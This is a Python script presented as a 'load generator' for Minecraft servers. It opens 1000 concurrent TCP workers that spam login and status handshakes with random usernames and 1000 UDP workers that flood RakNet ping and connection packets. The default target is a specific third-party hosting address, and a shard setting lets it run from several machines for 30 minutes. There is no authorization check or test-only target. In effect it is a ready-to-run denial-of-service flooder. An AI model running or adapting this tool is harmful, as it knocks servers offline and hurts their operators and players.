# combo_load.py — Java TCP + Bedrock UDP combo load generator
# python 3.12 | stdlib only

import asyncio
import os
import random
import signal
import socket
import struct
import string
import time

HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
PORT     = int(os.environ.get("PORT", "5073"))
DURATION = int(os.environ.get("DURATION", "1800"))
CONC_J   = int(os.environ.get("CONC_J", "1000"))   # java workers
CONC_B   = int(os.environ.get("CONC_B", "1000"))   # bedrock workers
SHARD    = os.environ.get("SHARD", "0")

CONNECT_TIMEOUT  = 5.0
READ_TIMEOUT     = 3.0
PROTOCOL_VERSION = 763   # 1.20.1

STATE_STATUS = 1
STATE_LOGIN  = 2

RAKNET_MAGIC = bytes([
    0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
    0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
])


# ---- Java helpers ----
def vi_write(v: int) -> bytes:
    out = b""
    while True:
        b = v & 0x7F
        v >>= 7
        out += bytes([b | 0x80]) if v else bytes([b])
        if not v:
            return out


def pack_string(s: str) -> bytes:
    r = s.encode("utf-8")
    return vi_write(len(r)) + r


def pack_packet(pid: int, payload: bytes = b"") -> bytes:
    body = vi_write(pid) + payload
    return vi_write(len(body)) + body


def hs_java(host: str, port: int, state: int) -> bytes:
    p = (vi_write(PROTOCOL_VERSION) + pack_string(host)
         + struct.pack(">H", port) + vi_write(state))
    return pack_packet(0x00, p)


def rand_name_java() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits,
                                  k=random.randint(3, 16)))


# ---- Bedrock helpers ----
def rak_ping() -> bytes:
    t = int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF
    g = random.getrandbits(64)
    return b"\x01" + struct.pack(">Q", t) + RAKNET_MAGIC + struct.pack(">Q", g)


def rak_oc1() -> bytes:
    return b"\x05" + RAKNET_MAGIC + bytes([11]) + struct.pack(">H", 0)


def rak_oc2() -> bytes:
    return (b"\x07" + RAKNET_MAGIC + struct.pack(">I", random.getrandbits(32))
            + b"\x00")


# ---- stats ----
class Stats:
    def __init__(self):
        self.j_ok = 0
        self.j_fail = 0
        self.b_sent = 0
        self.b_rx = 0
        self.b_rx_bytes = 0
        self.b_fail = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def inc_j(self, ok=0, fail=0):
        async with self.lock:
            self.j_ok += ok
            self.j_fail += fail

    async def inc_b(self, sent=0, rx=0, b=0, fail=0):
        async with self.lock:
            self.b_sent += sent
            self.b_rx += rx
            self.b_rx_bytes += b
            self.b_fail += fail

    def snap(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        return (f"[shard {SHARD}] J ok={self.j_ok} fail={self.j_fail} "
                f"rate={self.j_ok / dt:.0f} | "
                f"B sent={self.b_sent} rx={self.b_rx} "
                f"rxb={self.b_rx_bytes} fail={self.b_fail} "
                f"rate={self.b_sent / dt:.0f}")


STATS = Stats()
STOP = asyncio.Event()


# ============ JAVA WORKER (TCP) ============
async def java_join_once():
    """Handshake state=LOGIN + Login Start + tahan sebentar."""
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(hs_java(HOST, PORT, STATE_LOGIN))
        w.write(pack_packet(0x00, pack_string(rand_name_java())))
        await w.drain()
        await asyncio.sleep(random.uniform(0.2, 0.8))
        w.close()
        await STATS.inc_j(ok=1)
    except (asyncio.TimeoutError, OSError):
        await STATS.inc_j(fail=1)


async def java_handshake_once():
    """Handshake state=STATUS + Status Request, langsung close."""
    pkt = hs_java(HOST, PORT, STATE_STATUS) + pack_packet(0x00)
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(pkt)
        await w.drain()
        w.close()
        await STATS.inc_j(ok=1)
    except (asyncio.TimeoutError, OSError):
        await STATS.inc_j(fail=1)


async def java_worker():
    while not STOP.is_set():
        r = random.random()
        if r < 0.6:
            await java_join_once()
        else:
            await java_handshake_once()


# ============ BEDROCK WORKER (UDP) ============
class BedrockWorker:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
        self.sock.setblocking(False)
        self.pkts = [rak_ping(), rak_oc1(), rak_oc2()]

    async def run(self):
        while not STOP.is_set():
            try:
                pkt = random.choice(self.pkts)
                self.sock.sendto(pkt, (HOST, PORT))
                await STATS.inc_b(sent=1)
                # coba baca balasan (non-blocking)
                for _ in range(3):
                    try:
                        data, _ = self.sock.recvfrom(4096)
                        await STATS.inc_b(rx=1, b=len(data))
                    except BlockingIOError:
                        break
                    except OSError:
                        break
                await asyncio.sleep(0.0001)
            except OSError:
                await STATS.inc_b(fail=1)


# ============ REPORTER ============
async def reporter():
    while not STOP.is_set():
        await asyncio.sleep(3)
        print(STATS.snap(), flush=True)


# ============ MAIN ============
async def main():
    print(f"[shard {SHARD}] host={HOST} port={PORT} "
          f"java_conc={CONC_J} bedrock_conc={CONC_B} dur={DURATION}s",
          flush=True)

    java_tasks = [asyncio.create_task(java_worker()) for _ in range(CONC_J)]
    bedrock_workers = [BedrockWorker() for _ in range(CONC_B)]
    bedrock_tasks = [asyncio.create_task(w.run()) for w in bedrock_workers]
    rep = asyncio.create_task(reporter())

    try:
        await asyncio.sleep(DURATION)
    finally:
        STOP.set()
        rep.cancel()
        for t in java_tasks + bedrock_tasks:
            t.cancel()
        await asyncio.gather(*(java_tasks + bedrock_tasks),
                             return_exceptions=True)

    print(STATS.snap(), flush=True)


def _sig(s, f):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
